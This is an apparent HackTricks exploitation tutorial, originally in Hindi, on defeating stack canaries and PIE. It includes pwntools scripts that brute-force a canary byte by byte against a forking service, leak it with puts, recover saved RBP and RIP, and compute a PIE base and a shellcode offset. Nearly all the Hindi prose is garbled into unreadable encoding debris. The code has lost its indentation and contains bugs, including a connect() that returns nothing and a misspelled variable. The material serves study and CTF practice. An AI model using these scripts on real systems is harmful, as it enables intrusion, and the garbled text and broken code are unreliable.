<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks_live**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>


**рдпрджрд┐ рдЖрдкрдХреЗ рд╕рд╛рдордиреЗ рдПрдХ рдХреИрдирд░реА рдФрд░ PIE (Position Independent Executable) рджреНрд╡рд╛рд░рд╛ рд╕рдВрд░рдХреНрд╖рд┐рдд рдмрд╛рдЗрдирд░реА рд╣реИ, рддреЛ рдЖрдкрдХреЛ рд╢рд╛рдпрдж рдЙрдиреНрд╣реЗрдВ рджрд░рдХрд┐рдирд╛рд░ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдвреВрдВрдврдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред**

![](<../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **`checksec`** рдпрд╣ рдирд╣реАрдВ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддрд╛ рдХрд┐ рдПрдХ рдмрд╛рдЗрдирд░реА рдХреЛ рдХреИрдирд░реА рджреНрд╡рд╛рд░рд╛ рд╕рдВрд░рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЕрдЧрд░ рдпрд╣ рд╕реНрдерд╛рдИ рд░реВрдк рд╕реЗ рдХреЙрдореНрдкрд╛рдЗрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдФрд░ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдкрд╣рдЪрд╛рдирдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдирд╣реАрдВ рд╣реИред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рдЗрд╕реЗ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рдиреЛрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдЧрд░ рдЖрдкрдХреЛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдХрд┐рд╕реА рдлрд╝рдВрдХреНрд╢рди рдХреЙрд▓ рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рд╕реНрдЯреИрдХ рдореЗрдВ рдПрдХ рдорд╛рди рд╕рд╣реЗрдЬрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдЗрд╕ рдорд╛рди рдХреА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛рддреА рд╣реИ рдкрд╣рд▓реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рд╕реЗ рдкрд╣рд▓реЗред
{% endhint %}

# рдХреИрдирд░реА рдХреЛ рдмреНрд░реВрдЯ рдлрд╝реЛрд░реНрд╕ рдХрд░реЗрдВ

рдПрдХ рд╕рд╛рдзрд╛рд░рдг рдХреИрдирд░реА рдХреЛ рджрд░рдХрд┐рдирд╛рд░ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рдпрд╣ рд╣реИ рдЕрдЧрд░ рдмрд╛рдЗрдирд░реА рдПрдХ рдХрд╛рд░реНрдпрдХреНрд░рдо рд╣реИ **рд╣рд░ рдмрд╛рд░ рдЬрдм рдЖрдк рдЗрд╕рдХреЗ рд╕рд╛рде рдПрдХ рдирдпрд╛ рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдЪрд╛рдЗрд▓реНрдб рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ рдлреЙрд░реНрдХ рдХрд░рддрд╛ рд╣реИ** (рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛), рдХреНрдпреЛрдВрдХрд┐ рд╣рд░ рдмрд╛рд░ рдЬрдм рдЖрдк рдЗрд╕рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рддреЗ рд╣реИрдВ **рд╡рд╣реА рдХреИрдирд░реА рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдПрдЧреА**ред

рдЗрд╕рдХреЗ рдмрд╛рдж, рдХреИрдирд░реА рдХреЛ рджрд░рдХрд┐рдирд╛рд░ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рдпрд╣ рд╣реИ рдХреЗрд╡рд▓ **рдЪрд╛рд░ рджреНрд╡рд╛рд░рд╛ рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕ рдХрд░рдирд╛**, рдФрд░ рдЖрдк рдпрд╣ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдЕрдиреБрдорд╛рдирд┐рдд рдХреИрдирд░реА рдмрд╛рдЗрдЯ рд╕рд╣реА рдерд╛ рдпрд╛ рдЧрд▓рдд рдерд╛ рдЬрд╛рдВрдЪ рдХрд░рдХреЗ рдпрджрд┐ рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреНрд░реИрд╢ рд╣реЛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рдЕрдкрдиреА рдирд┐рдпрдорд┐рдд рдлреНрд▓реЛ рдХреЛ рдЬрд╛рд░реА рд░рдЦрддрд╛ рд╣реИред рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдлрд╝рдВрдХреНрд╢рди **8 рдмрд╛рдЗрдЯ рдХреИрдирд░реА (x64)** рдХреЛ **рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕ рдХрд░рддрд╛ рд╣реИ** рдФрд░ рд╕рд╣реА рдЕрдиреБрдорд╛рдирд┐рдд рдмрд╛рдЗрдЯ рдФрд░ рдПрдХ рдмреБрд░рд╛ рдмрд╛рдЗрдЯ рдХреЗ рдмреАрдЪ рднрд┐рдиреНрди рдХрд░рддрд╛ рд╣реИ рдмрд╕ **рдЬрд╛рдВрдЪ рдХрд░рдХреЗ** рдХрд┐ рдХреНрдпрд╛ **рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдПрдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рднреЗрдЬреА рдЧрдИ рд╣реИ (рдЕрдиреНрдп рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдПрдХ **try/except** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ):

## рдЙрджрд╛рд╣рд░рдг 1

рдпрд╣ рдЙрджрд╛рд╣рд░рдг 64 рдмрд┐рдЯ рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдЖрд╕рд╛рдиреА рд╕реЗ 32 рдмрд┐рдЯ рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
## рдЙрджрд╛рд╣рд░рдг 2

рдпрд╣ 32 рдмрд┐рдЯ рдХреЗ рд▓рд┐рдП рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ рдЖрд╕рд╛рдиреА рд╕реЗ 64 рдмрд┐рдЯ рдХреЗ рд▓рд┐рдП рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдкреНрд░реЛрдЧреНрд░рд╛рдо рд╕реЗ рдкрд╣рд▓реЗ рдПрдХ рдмрд╛рдЗрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдЬреЛ рдЗрдирдкреБрдЯ рдФрд░ рдкреЗрд▓реЛрдб рдХрд╛ рдЖрдХрд╛рд░ рджрд░реНрд╢рд╛рддреА рд╣реИ**ред
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
# рдкреНрд░рд┐рдВрдЯ рдХреИрдирд░реА

рдХреИрдирд░реА рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рдЙрд╕реЗ **рдкреНрд░рд┐рдВрдЯ рдХрд░рдирд╛** рд╣реИред\
рд╕реЛрдЪрд┐рдП рдПрдХ рд╕реНрдерд┐рддрд┐ рдЬрд╣рд╛рдБ рдПрдХ **рдХрд╛рд░реНрдпрдХреНрд░рдо рд╕реБрд░рдХреНрд╖рд┐рдд** рд╣реИ рдЬреЛ рд╕реНрдЯреИрдХ рдУрд╡рд░рдлреНрд▓реЛ рдХреЛ рдХреНрд░рдорд╢: **рдкреНрд░рд╛рд░рдВрдн** рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **puts** рдлрд╝рдВрдХреНрд╢рди рдХреЛ **рд╕реНрдЯреИрдХ рдУрд╡рд░рдлреНрд▓реЛ рдХреЗ рд╣рд┐рд╕реНрд╕реЗ рдХреА рдУрд░ рдкреЙрдЗрдВрдЯ рдХрд░рддрд╛ рд╣реИ**ред рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдкрддрд╛ рд╣реИ рдХрд┐ **рдХреИрдирд░реА рдХрд╛ рдкрд╣рд▓рд╛ рдмрд╛рдЗрдЯ рдПрдХ рдирд▓ рдмрд╛рдЗрдЯ рд╣реИ** (`\x00`) рдФрд░ рдмрд╛рдХреА рдХреИрдирд░реА **рд░реИрдВрдбрдо рдмрд╛рдЗрдЯреНрд╕** рд╣реИрдВред рддрдм, рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдУрд╡рд░рдлреНрд▓реЛ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд╕рд┐рд░реНрдл рдХреИрдирд░реА рдХреЗ рдкрд╣рд▓реЗ рдмрд╛рдЗрдЯ рддрдХ рд╕реНрдЯреИрдХ рдХреЛ **рдУрд╡рд░рд░рд╛рдЗрдЯ** рдХрд░рддрд╛ рд╣реИред\
рдлрд┐рд░, рд╣рдорд▓рд╛рд╡рд░ **рдкреЗрд▓реЛрдб рдХреЗ рдмреАрдЪ рдореЗрдВ рдкреБрдЯреНрд╕ рдлрд╝рдВрдХреНрд╢рди** рдХреЛ **рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ** рдЬреЛ рд╕рднреА рдХреИрдирд░реА рдХреЛ **рдкреНрд░рд┐рдВрдЯ рдХрд░реЗрдЧрд╛** (рдирд▓ рдмрд╛рдЗрдЯ рдХреЛ рдЫреЛрдбрд╝рдХрд░)ред\
рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде рд╣рдорд▓рд╛рд╡рд░ рдирдП рд╣рдорд▓реЗ рдХреЛ рдЬрд╛рдирддрд╛ рд╣реИ рдФрд░ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ рдХреИрдирд░реА рдХреЛ рдЬрд╛рдирддреЗ рд╣реБрдП (рдЙрд╕реА рдХрд╛рд░реНрдпрдХреНрд░рдо рд╕рддреНрд░ рдореЗрдВ)

рд╕реНрдкрд╖реНрдЯ рд╣реИ рдХрд┐ рдпрд╣ рдпреБрдХреНрддрд┐ рдмрд╣реБрдд **рд╕реАрдорд┐рдд** рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЕрдкрдиреЗ рдкреЗрд▓реЛрдб рдХреА **рд╕рд╛рдордЧреНрд░реА** рдХреЛ **рдкреНрд░рд┐рдВрдЯ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ **рдХреИрдирд░реА** рдХреЛ **рдирд┐рдХрд╛рд▓** рд╕рдХреЗ рдФрд░ рдлрд┐рд░ рдПрдХ рдирдП рдкреЗрд▓реЛрдб (рдЙрд╕реА **рдХрд╛рд░реНрдпрдХреНрд░рдо рд╕рддреНрд░** рдореЗрдВ) рдмрдирд╛ рд╕рдХреЗ рдФрд░ **рднреЗрдЬ** рд╕рдХреЗ **рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ**ред\
CTF рдЙрджрд╛рд╣рд░рдг: [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)

# PIE

PIE рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рдХреБрдЫ рдкрддрд╛ рд▓рдЧрд╛рдирд╛** рд╣реЛрдЧрд╛ред рдФрд░ рдпрджрд┐ рдмрд╛рдЗрдирд░реА рдХреЛ рдХреЛрдИ рдкрддрд╛ рдирд╣реАрдВ рд▓рдЧ рд░рд╣рд╛ рд╣реИ рддреЛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рд╣реИ **рд╕реНрдЯреИрдХ рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЧрдП RBP рдФрд░ RIP рдХреЛ рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕ рдХрд░рдирд╛** рдЬреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рд╣реИред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдПрдХ рдмрд╛рдЗрдирд░реА рдХреЛ рдПрдХ **рдХреИрдирд░реА** рдФрд░ **PIE** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЖрдк рдХреИрдирд░реА рдХреЛ рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдлрд┐рд░ **рдЕрдЧрд▓реЗ** 8 рдмрд╛рдЗрдЯ (x64) рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЧрдП **RBP** рд╣реЛрдЧрд╛ рдФрд░ **рдЕрдЧрд▓реЗ** 8 рдмрд╛рдЗрдЯ рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЧрдП **RIP** рд╣реЛрдЧрд╛ред

рдмрд╛рдЗрдирд░реА рд╕реЗ RBP рдФрд░ RIP рдХреЛ рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдпрд╣ рддрдп рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рдорд╛рдиреНрдп рдЕрдиреБрдорд╛рдирд┐рдд рдмрд╛рдЗрдЯ рд╕рд╣реА рд╣реИ рдЕрдЧрд░ рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреБрдЫ рдЖрдЙрдЯрдкреБрдЯ рдХрд░рддрд╛ рд╣реИ рдпрд╛ рдпрд╣ рдХреЗрд╡рд▓ рдХреНрд░реИрд╢ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред рдХреИрдирд░реА рдХреЛ рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рд╡рд╣реА рдлрд╝рдВрдХреНрд╢рди RBP рдФрд░ RIP рдХреЛ рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```python
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
## рдкреЗрд╕реНрдЯ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ

PIE рдХреЛ рдкрд░рд╛рд╕реНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдЖрдЦрд┐рд░реА рдЪреАрдЬрд╝ рдпрд╣ рд╣реИ рдХрд┐ рд▓реАрдХ рд╣реБрдП рдкрддреЛрдВ рд╕реЗ **рдЙрдкрдпреЛрдЧреА рдкрддреЛрдВ рдХреА рдЧрдгрдирд╛ рдХрд░рдиреА рд╣реИ**: **RBP** рдФрд░ **RIP**ред

**RBP** рд╕реЗ рдЖрдк **рд╕реНрдЯреИрдХ рдореЗрдВ рдЕрдкрдиреЗ рд╢реИрд▓ рдХреЛ рдХрд╣рд╛рдБ рд▓рд┐рдЦ рд░рд╣реЗ рд╣реИрдВ** рдпрд╣ рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдЬрд╛рдирдирд╛ рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЖрдк _"/bin/sh\x00"_ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рд╕реНрдЯреИрдХ рдХреЗ рдЕрдВрджрд░ рдХрд╣рд╛рдБ рд▓рд┐рдЦрдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВред рд▓реАрдХ рд╣реБрдП RBP рдФрд░ рдЕрдкрдиреЗ рд╢реИрд▓рдХреЛрдб рдХреЗ рдмреАрдЪ рдХреА рджреВрд░реА рдХреА рдЧрдгрдирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдмрд╕ рдПрдХ **рдмреНрд░реЗрдХрдкреЙрдЗрдВрдЯ рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм RBP рд▓реАрдХ рд╣реЛ рдЬрд╛рдП** рдФрд░ рдЪреЗрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **рдЖрдкрдХрд╛ рд╢реИрд▓рдХреЛрдб рдХрд╣рд╛рдБ рд╕реНрдерд┐рдд рд╣реИ**, рдлрд┐рд░, рдЖрдк рд╢реИрд▓рдХреЛрдб рдФрд░ RBP рдХреЗ рдмреАрдЪ рдХреА рджреВрд░реА рдХреА рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
INI_SHELLCODE = RBP - 1152
```
**RIP** рд╕реЗ рдЖрдк **PIE рдмрд╛рдЗрдирд░реА рдХрд╛ рдмреЗрд╕ рдкрддрд╛** рдХреИрд▓рдХреБрд▓реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдЖрдкрдХреЛ **рдПрдХ рд╡реИрдз ROP рд╢реНрд░реГрдВрдЦрд▓рд╛ рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**ред
рдмреЗрд╕ рдкрддрд╛ рдХреА рдЧрдгрдирд╛ рдХреЗ рд▓рд┐рдП рдмрд╕ `objdump -d vunbinary` рдХрд░реЗрдВ рдФрд░ рдбрд┐рд╕рдПрд╕реЗрдореНрдмрд▓ рдирд╡реАрдирддрдо рдкрддреЗ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:

![](<../../.gitbook/assets/image (145).png>)

рдЙрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рд╕рднреА рдХреЛрдб рдХреЛ рдвреВрдВрдврдиреЗ рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ **1 рдмрд╛рдЗрдЯ рдФрд░ рдЖрдзрд╛** рдЖрд╡рд╢реНрдпрдХ рд╣реИ, рдлрд┐рд░, рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдмреЗрд╕ рдкрддрд╛ рд╣реЛрдЧрд╛ **рд▓реАрдХ рдХрд┐рдП рдЧрдП RIP рдкрд░ рд▓реЗрдХрд┐рди "000" рдкрд░ рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЕрдЧрд░ рдЖрдкрдиреЗ _0x562002970**ecf**_ рд▓реАрдХ рдХрд┐рдпрд╛ рд╣реИ рддреЛ рдмреЗрд╕ рдкрддрд╛ _0x562002970**000**_ рд╣реЛрдЧрд╛ред
```python
elf.address = RIP - (RIP & 0xfff)
```
<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

рджреВрд╕рд░реЗ рддрд░реАрдХреЗ HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ **The PEASS Family** рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks_live**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** PRs рдХреЛ **рдЬрдорд╛ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>
